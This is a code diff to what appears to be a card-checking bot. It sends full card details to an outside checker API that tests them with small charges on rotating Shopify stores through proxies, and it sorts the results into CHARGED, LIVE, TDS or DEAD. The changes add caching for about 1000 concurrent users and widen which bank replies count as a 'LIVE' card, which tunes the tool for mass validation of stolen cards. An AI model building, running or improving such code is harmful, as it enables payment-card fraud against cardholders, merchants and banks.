@@ -94,6 +94,19 @@ _BIN_CACHE:   dict  = {}
 _DEAD_SITES:  set   = set()
 _ALL_PROXIES: list  = []
 
+# ── Disk-IO TTL caches ─────────────────────────────────────────────────────
+# _load_proxies() and _load_sites() read files from disk.
+# For 1000 concurrent users each calling /sh, re-reading the file every time
+# would serialize 1000 blocking disk reads on the event loop.
+# These TTL caches ensure disk is only touched once per interval — every
+# subsequent call returns the in-memory copy instantly (no I/O, no blocking).
+_PROXY_CACHE_TS:  float = 0.0
+_PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes
+
+_SITES_RAW_CACHE: list  = []
+_SITES_RAW_TS:    float = 0.0
+_SITES_RAW_TTL:   float = 300.0   # refresh sites from disk every 5 minutes
+
 # Site-prober cache — populated by probe_all_sites(), used by get_working_sites()
 _WORKING_SITES:     list  = []
 _PROBE_IN_PROGRESS: bool  = False
@@ -201,84 +214,135 @@ def get_plan_emoji_id(plan_name: str) -> str:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFICATION  — exact match to msh.py logic
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RETRY_ERRORS = site/infrastructure errors → skip this site, try another
-# These are NOT bank responses — the site itself is broken/unsupported.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RETRY_ERRORS — site / infrastructure errors
+# These mean the Shopify SITE is broken, not that the card failed.
+# The retry loop discards this site and tries another.
+#
+# ⚠  NEVER add single common words like 'failed', 'item', 'resolve' here.
+#    Substring matching means 'failed' would eat bank responses that contain
+#    "failed" (e.g. "AUTHENTICATION_FAILED") and turn real LIVE cards into
+#    endless RETRY loops.  Only add specific, unambiguous strings.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 RETRY_ERRORS = [
-    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
-    'product not found', 'hcaptcha detected', 'tax ammount empty',
-    'del ammount empty', 'product id is empty', 'py id empty',
-    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
-    'site error! status: 429', 'site requires login!', 'failed to get token',
-    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
-    'connection error', 'connection error!', 'error processing card',
-    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
-    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
-    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
-    'connect tunnel failed', 'timeout', 'proxy error',
+    # ── Token / checkout pipeline failures ─────────────────────────────────
+    'r4 token empty', 'r2 id empty', 'clinte token',
+    'failed to get token', 'token not found', 'failed to get checkout',
+    'failed to get session token', 'failed to add to cart',
+    'could not extract receiptid', 'receiptid missing',
+    'response missing receiptid', 'missing receiptId', 'errmissingreceiptid',
+    'could not extract signedhandles', 'extract signedHandles',
+    'could not extract private_access_token',
+    'could not extract identification signature',
+    'could not extract session id', 'could not extract queuetoken',
+    'could not extract delivery handle', 'could not extract shipping amount',
+    'could not extract total amount', 'could not extract sessiontoken',
+    'could not find actions js url',
+    'missing stableid', 'missing buildid', 'missing sourcetoken',
+    'missing proposal', 'missing submit id',
+
+    # ── Site not usable ─────────────────────────────────────────────────────
+    'payment method is not shopify!', 'not shopify!',
+    'site not supported for now!', 'site not supported',
+    'site requires login!', 'site overloaded', 'site rate limited',
+    'application not found', 'store not found', 'app not found',
+    'store incompatible', 'errstoreincompatible',
+
+    # ── Product / inventory problems ────────────────────────────────────────
+    'product not found', 'product id is empty', 'py id empty',
+    'no valid products', 'no available products found',
+    'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
+    'MERCHANDISE_OUT_OF_STOCK', 'products.json',
+    'INVENTORY_FAILURE', 'inventory_failure',
+    'retryable: inventory reservation failure',
+
+    # ── Security / captcha ──────────────────────────────────────────────────
+    'hcaptcha detected', 'hcaptcha_detected',
+
+    # ── Delivery / shipping pipeline ────────────────────────────────────────
+    'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
+    'delivery_no_delivery_strategy_available',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
+    'delivery_no_delivery_strategy_available_for_merchandise_line',
+    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
+    'delivery_delivery_line_detail_changed',
+    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
+    'delivery_strategy_conditions_not_satisfied',
+    'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
+    'delivery_out_of_stock_at_origin_location',
+
+    # ── Session / validation errors ─────────────────────────────────────────
+    'SESSION_ERROR', 'session_error', 'receipt_empty',
+    'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
+    'VAULT_FAILED', 'exceeded 30 poll attempts',
+
+    # ── Tax / amount pipeline ───────────────────────────────────────────────
+    'tax ammount empty', 'del ammount empty',
+
+    # ── HTTP-level site errors (from the checker API) ───────────────────────
+    'site error! status: 401', 'site error! status: 402',
+    'site error! status: 403', 'site error! status: 404',
+    'site error! status: 429',
+    'site error! status: 500', 'site error! status: 502',
+    'site error! status: 503', 'site error! 503',
+    'site error',
+    'returned status 429', 'returned status 500',
+    'returned status 502', 'returned status 503', 'returned status 504',
+
+    # ── Network / proxy errors ──────────────────────────────────────────────
+    'connection error', 'connection error!',
+    'could not resolve host', 'connect tunnel failed',
+    'proxy error', 'curl error', 'http error',
+    'timeout',
+
+    # ── Checkout step failures (specific — not just "failed") ───────────────
     'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
     'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
     'step 8 failed', 'step 9 failed', 'step 10 failed',
-    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
-    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
-    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
-    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
-    'no available products found', 'could not extract receiptid',
-    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
-    'could not extract signedhandles', 'receiptid missing',
-    'response missing receiptid', 'INVENTORY_FAILURE',
-    'products.json', 'returned status 429', 'returned status 500',
-    'returned status 502', 'returned status 503', 'returned status 504',
-    'store incompatible', 'extract signedHandles', 'missing receiptId',
-    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
-    'site error! status: 404', 'site error! status: 500', 'site error! status: 402',
-    'site error! status: 502', 'site error! 503', 'site error! status: 503',
-    'site error! status: 403', 'site error! status: 401',
-    'site not supported for now!', 'site not supported', 'site error',
-    'failed to get checkout', 'failed to add to cart', 'site overloaded', 'site rate limited',
-    'delivery_delivery_line_detail_changed', 'failed to get session token',
-    'unable to get payment token', 'validation_custom', 'http error',
-    'missing stableid', 'missing buildid', 'missing sourcetoken', 'checkout_failed',
-    'delivery_out_of_stock_at_origin_location',
-    'could not extract private_access_token', 'no_products',
+    'error processing card',
+
+    # ── Gateway / buyer identity issues ─────────────────────────────────────
+    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
+    'payments_credit_card_brand_not_supported',
+    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
     'buyer_identity_currency_not_supported_by_shop',
-    'could not find actions js url', 'session_error', 'delivery_zone_not_found',
-    'missing proposal', 'missing submit id', 'delivery_strategy_conditions_not_satisfied',
-    'retryable: inventory reservation failure', 'inventory_failure',
-    'exceeded 30 poll attempts',
-    'delivery_no_delivery_strategy_available_for_merchandise_line',
-    'could not extract queuetoken', 'delivery_no_delivery_strategy_available',
-    'could not extract identification signature',
-    'could not extract session id', 'payments_credit_card_brand_not_supported',
-    'could not extract delivery handle', 'could not extract signedhandles',
-    'could not extract shipping amount', 'could not extract total amount',
-    'could not extract sessiontoken', 'errstoreincompatible', 'errmissingreceiptid',
-    'application not found', 'store not found', 'app not found',
+    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
+    'unable to get payment token',
 ]
 
-# DECLINED_RESPONSES = real bank hard-decline → card is dead, stop checking
+# DECLINED_RESPONSES = confirmed bank hard-declines → card is genuinely bad
+# ⚠  Do NOT add CALL_ISSUER here — it means "call your bank", which implies
+#    the card exists and is valid.  It is classified as LIVE in classify_response.
 DECLINED_RESPONSES = [
     'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
     'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
     'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
     'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
     'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
-    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
+    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
     'TRANSACTION_NOT_ALLOWED',
 ]
 
 # Keep old names as aliases so probe functions still work
 DEAD_ERRORS     = RETRY_ERRORS
 SUCCESS_RESPONSES = [
-    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
-    'GENERIC_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR',
-    'Processing Error', 'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
-    'FRAUD_SUSPECTED', '3DS_REQUIRED', 'AMOUNT_TOO_SMALL',
-    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'INCORRECT_NUMBER',
-    'DO_NOT_HONOR', 'INCORRECT_CVC', 'INVALID_CVC', 'SECURITY_VIOLATION',
-    'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD', 'STOLEN_CARD', 'LOST_CARD',
-    'CALL_ISSUER', 'TEST_MODE_LIVE_CARD', 'PROCESSING_ERROR',
-    '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED', 'SCA_REQUIRED',
+    # ── Confirmed LIVE (card hit the bank, soft/ambiguous decline) ──────────
+    'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
+    'INVALID_CVC', 'INVALID_CVV', 'SECURITY_VIOLATION',
+    'PCI_ERROR', 'CVV_FAILED', 'AVS_FAILED', 'RISK_BLOCKED',
+    'CALL_ISSUER', 'GENERIC_ERROR',
+    # ── TDS (3-D Secure required) ────────────────────────────────────────────
+    '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED', 'SCA_REQUIRED',
+    # ── Charged ──────────────────────────────────────────────────────────────
     'ORDER_PAID', 'PAYMENT_AUTHORIZED', 'PAYMENT_ACCEPTED', 'CHARGED', 'APPROVED',
+    # ── Bank hard-declines (card reached bank but was rejected) ──────────────
+    'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
+    'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR',
+    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
+    'TEST_MODE_LIVE_CARD', 'INCORRECT_NUMBER', 'RESTRICTED_CARD',
+    'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
 ]
 
 
@@ -296,41 +360,70 @@ def _is_success_response(resp: str) -> bool:
 
 def classify_response(resp: str) -> str:
     """
-    Classify API response — exact msh.py logic.
-    Returns: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
-      CHARGED/TDS/LIVE/DEAD → stop checking this card (final verdict)
-      RETRY                 → site/infra error, try a different site
-      ERROR                 → unknown response, try a different site
+    Classify a response string from shopi.up.railway.app.
+    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
+
+      CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
+      RETRY / ERROR                →  site/infra problem, try a different site
+
+    Note: _parse_response_field() already converts Status=true → "ORDER_PAID"
+    before this function is called, so every charged card arrives as ORDER_PAID.
+
+    GENERIC_ERROR classification:
+      Shopify returns GENERIC_ERROR when the bank gave an ambiguous response —
+      the charge was submitted and the bank replied, but the outcome is unclear.
+      This means the card IS valid (it hit a real bank).  → LIVE, not DEAD.
     """
     if not resp:
         return "RETRY"
     mu = resp.upper().strip()
     ml = resp.lower().strip()
 
-    # ── CHARGED (real money moved) ───────────────────────────────────────────
-    if "ORDER_PAID" in mu or "CHARGED" in mu:
+    # ── CHARGED ──────────────────────────────────────────────────────────────
+    if ("ORDER_PAID"          in mu
+            or "PAYMENT_AUTHORIZED" in mu
+            or "PAYMENT_ACCEPTED"   in mu
+            or "APPROVED"           in mu
+            or mu == "CHARGED"):
         return "CHARGED"
 
     # ── TDS (3-D Secure redirect) ────────────────────────────────────────────
-    if "3DS_REQUIRED" in mu:
+    if ("3DS_REQUIRED"            in mu
+            or "3D_SECURE"            in mu
+            or "AUTHENTICATION_REQUIRED" in mu
+            or "SCA_REQUIRED"         in mu):
         return "TDS"
 
-    # ── LIVE (card valid — bank gave a real soft-decline) ───────────────────
-    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
-            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
+    # ── LIVE (card reached the bank — soft / ambiguous decline) ─────────────
+    # GENERIC_ERROR → card is LIVE.  The bank replied; the response was
+    # ambiguous.  Do NOT classify this as DEAD — live cards look like this.
+    if ("INSUFFICIENT_FUNDS"  in mu
+            or "INCORRECT_CVV"    in mu
+            or "INCORRECT_CVC"    in mu
+            or "INCORRECT_ZIP"    in mu
+            or "INVALID_CVC"      in mu
+            or "INVALID_CVV"      in mu
+            or "PCI_ERROR"        in mu
+            or "CVV_FAILED"       in mu
+            or "AVS_FAILED"       in mu
+            or "RISK_BLOCKED"     in mu
+            or "SECURITY_VIOLATION" in mu
+            or "CALL_ISSUER"      in mu
+            or "GENERIC_ERROR"    in mu):   # ← KEY FIX: was incorrectly DEAD
         return "LIVE"
 
-    # ── DEAD (bank hard-declined — card is genuinely bad) ───────────────────
-    if "GENERIC_ERROR" in mu:
-        return "DEAD"
+    # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
     if any(d.upper() in mu for d in DECLINED_RESPONSES):
         return "DEAD"
 
-    # ── RETRY (site/infra error — try a different site) ─────────────────────
+    # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
+    # Uses exact substring matching against specific strings only.
+    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS —
+    # they would eat valid bank responses that happen to contain that word.
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
-    # Unknown — try another site
+    # Unknown response — try another site; never mark the card dead on unknown
     return "ERROR"
 
 
@@ -365,8 +458,19 @@ def _strip_proxy_scheme(p: str) -> str:
 
 
 def _load_proxies() -> list:
-    global _ALL_PROXIES
+    """Load proxies from disk with a 5-minute TTL cache.
+
+    For 1000 concurrent /sh calls this means ONE disk read per 5 minutes
+    instead of 1000 blocking disk reads — all subsequent callers get the
+    in-memory list instantly with zero I/O.
+    """
+    global _ALL_PROXIES, _PROXY_CACHE_TS
     import os
+    now = time.time()
+    # Return cached result if it is still fresh
+    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
+        return list(_ALL_PROXIES)
+
     for fname in ("px.txt", "proxies.txt"):
         for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
             path = os.path.join(base, fname) if base else fname
@@ -376,13 +480,15 @@ def _load_proxies() -> list:
                            if l.strip() and not l.startswith(("#", "//", ";"))]
                 if raw:
                     lines = [_strip_proxy_scheme(p) for p in raw]
-                    _ALL_PROXIES = lines
-                    logging.info(f"[SH] {len(lines)} proxies from {path}")
+                    _ALL_PROXIES    = lines
+                    _PROXY_CACHE_TS = time.time()
+                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}")
                     return lines
             except (FileNotFoundError, PermissionError):
                 pass
     logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
-    _ALL_PROXIES = []
+    _ALL_PROXIES    = []
+    _PROXY_CACHE_TS = time.time()   # cache the "empty" result too
     return []
 
 
@@ -395,32 +501,44 @@ def _strip_scheme(url: str) -> str:
 
 
 def _load_sites() -> list:
-    """
-    Load sites exclusively from sites.txt on disk.
-    Returns a fresh shuffled copy each call so every card gets a
-    different rotation order.
+    """Load sites from sites.txt with a 5-minute TTL cache.
+
+    Returns a FRESH SHUFFLED copy each call so every card gets a different
+    site-rotation order — the shuffle is done on the cached list, not on
+    disk, so no I/O happens after the first successful read within the TTL.
+    For 1000 concurrent /sh calls this means ONE disk read per 5 min.
+
     Raises RuntimeError if the file is missing or empty so the problem
     is immediately visible instead of silently checking nothing.
     """
+    global _SITES_RAW_CACHE, _SITES_RAW_TS
     import os
+    now = time.time()
+    # Return shuffled copy of cached list if still fresh
+    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
+        result = list(_SITES_RAW_CACHE)
+        random.shuffle(result)
+        return result
+
     for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
         path = os.path.join(base, "sites.txt") if base else "sites.txt"
         try:
             with open(path, encoding="utf-8", errors="ignore") as f:
-                lines = [_strip_scheme(l) for l in f
-                         if l.strip() and not l.startswith("#")]
-            lines = [l for l in lines if l]
-            if lines:
-                result = list(lines)
+                raw_lines = [_strip_scheme(l) for l in f
+                             if l.strip() and not l.startswith("#")]
+            raw_lines = [l for l in raw_lines if l]
+            if raw_lines:
+                _SITES_RAW_CACHE = raw_lines
+                _SITES_RAW_TS    = time.time()
+                result = list(raw_lines)
                 random.shuffle(result)
                 logging.info(f"[SH] {len(result)} sites loaded from {path}")
                 return result
         except (FileNotFoundError, PermissionError):
             pass
     raise RuntimeError(
-        "sites.txt not found or empty  create sites.txt with one Shopify domain per line"
+        "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
     )
-
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # SITE PROBER  — finds which sites the API actually supports
@@ -671,37 +789,40 @@ def extract_cards(text: str) -> list:
 def _parse_response_field(data: dict) -> str:
     """Extract the human-readable response string from the API JSON.
 
-    New API (shopi.up.railway.app) returns:
-      {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|..., ...}
+    shopi.up.railway.app returns:
+      {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
+       "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}
 
-    `Status` is a boolean — True means the charge succeeded.
-    We always prefer the `Response` string field; fall back to `Status` only
-    when Response is absent/empty (Status=True → ORDER_PAID, False → CARD_DECLINED).
+    CRITICAL: Status is authoritative.
+      Status=true  → card was CHARGED regardless of what Response says → "ORDER_PAID"
+      Status=false → use the Response string to classify LIVE / DEAD / RETRY
     """
-    # Prefer explicit string response fields first
+    # ── Status=true → charged, full stop ──────────────────────────────────
+    if data.get("Status") is True:
+        return "ORDER_PAID"
+
+    # ── Status=false → read the Response field ────────────────────────────
     for key in ("Response", "response", "message", "Message",
                 "result", "Result", "msg"):
         val = data.get(key)
         if val and isinstance(val, str) and val.strip():
+            resp = val.strip()
+            # "ERROR" from the API = infrastructure / unknown → RETRY
+            if resp.upper() == "ERROR":
+                return "site error! status: 500"
+            return resp
+
+    # ── No Response field + Status=false → hard decline ──────────────────
+    for key in ("error", "Error"):
+        val = data.get(key)
+        if val and isinstance(val, str) and val.strip():
             return val.strip()
 
-    # Fall back to the boolean Status field (new API)
-    status = data.get("Status")
-    if status is True:
-        return "ORDER_PAID"
-    if status is False:
-        # Try error / Error for a more specific decline reason
-        for key in ("error", "Error"):
-            val = data.get(key)
-            if val and isinstance(val, str) and val.strip():
-                return val.strip()
-        return "CARD_DECLINED"
-
-    return "Unknown Error"
+    return "CARD_DECLINED"
 
 
 def _proxy_url(proxy: Optional[str]) -> Optional[str]:
-    """Ensure proxy has http:// prefix as required by the new API."""
+    """Ensure proxy has http:// prefix as required by the API."""
     if not proxy:
         return None
     p = proxy.strip()
@@ -710,49 +831,86 @@ def _proxy_url(proxy: Optional[str]) -> Optional[str]:
     return f"http://{p}"
 
 
+def _normalise_gateway(raw: str) -> str:
+    """Normalise gateway name so probe and result code both see the same string.
+
+    API returns "shopify_payments" (lowercase, underscore).
+    Internal code (sitechk, classify) compares against "SHOPIFY PAYMENTS".
+    """
+    cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
+    return cleaned   # → "SHOPIFY PAYMENTS"
+
+
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    # API: https://shopi.up.railway.app/shopii
-    # GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
-    # site must be a plain domain — no https:// prefix
-    site_clean = _strip_scheme(site)          # strip any existing scheme
+    """Call the shopi.up.railway.app checker API.
+
+    Endpoint : https://shopi.up.railway.app/shopii
+    Method   : GET
+    Params   :
+        cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
+        site  = domain.myshopify.com (no https:// prefix)
+        proxy = http://ip:port       (optional)
+
+    Response JSON:
+        {"CC":..., "Currency":"USD", "Gateway":"shopify_payments",
+         "Price":"0.98", "Proxy":"None", "Response":"CARD_DECLINED",
+         "Status": false}
+
+    Status is authoritative:
+        true  → ORDER_PAID  (CHARGED)
+        false → use Response string (LIVE / DEAD / RETRY)
+    """
+    site_clean = _strip_scheme(site)      # drop any https:// prefix
     px         = _proxy_url(proxy)
     url = (f"{API_URL}?cc={card}&site={site_clean}&proxy={px}"
            if px else f"{API_URL}?cc={card}&site={site_clean}")
-    # connect=5 so hung proxies fail fast while still giving real sites room
-    _to  = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
+
+    # connect=5 → hung proxies fail fast; sock_read=timeout → generous for slow proxies
+    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
             async with session.get(url, ssl=False) as r:
                 http_st = r.status
                 raw     = await r.text()
-                # Empty body = API couldn't reach the store → treat as 404
+
+                # Empty body = API couldn't reach the store
                 if not raw or not raw.strip():
                     return ("site error! status: 404",
                             "Shopify Payments", "0.00", "USD", http_st)
+
                 if http_st == 200:
                     try:
                         data = _json.loads(raw)
                     except Exception:
+                        # Non-JSON 200 response — treat as site error
                         return ("site error! status: 404",
                                 "Shopify Payments", "0.00", "USD", http_st)
-                    gw       = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
-                    price    = str(data.get("Price")     or data.get("price")    or "0.00")
-                    currency = str(data.get("Currency")  or data.get("currency") or "USD")
+
+                    # Normalise gateway: "shopify_payments" → "SHOPIFY PAYMENTS"
+                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
+                    gw       = _normalise_gateway(raw_gw)
+                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
+                    currency = str(data.get("Currency") or data.get("currency") or "USD")
                     api_resp = _parse_response_field(data)
-                    logging.info(f"[API] {card[:6]}** {site} → {api_resp!r}")
+
+                    logging.info(f"[API] {card[:6]}** {site_clean} "
+                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
                     return api_resp, gw, price, currency, http_st
+
+                # Non-200 HTTP status from the API server
                 _emap = {
                     404: "site error! status: 404",
                     403: "site error! status: 403",
                     429: "site error! status: 429",
                     500: "site error! status: 500",
-                    502: "site error! status: 502",   # FIX: was 500 (wrong string)
-                    503: "site error! status: 503",   # FIX: was 500 (wrong string)
+                    502: "site error! status: 502",
+                    503: "site error! status: 503",
                     504: "timeout",
                 }
                 return (_emap.get(http_st, f"site error! status: {http_st}"),
                         "Shopify Payments", "0.00", "USD", http_st)
+
     except asyncio.TimeoutError:
         return ("timeout", "Shopify Payments", "0.00", "USD", None)
     except asyncio.CancelledError:
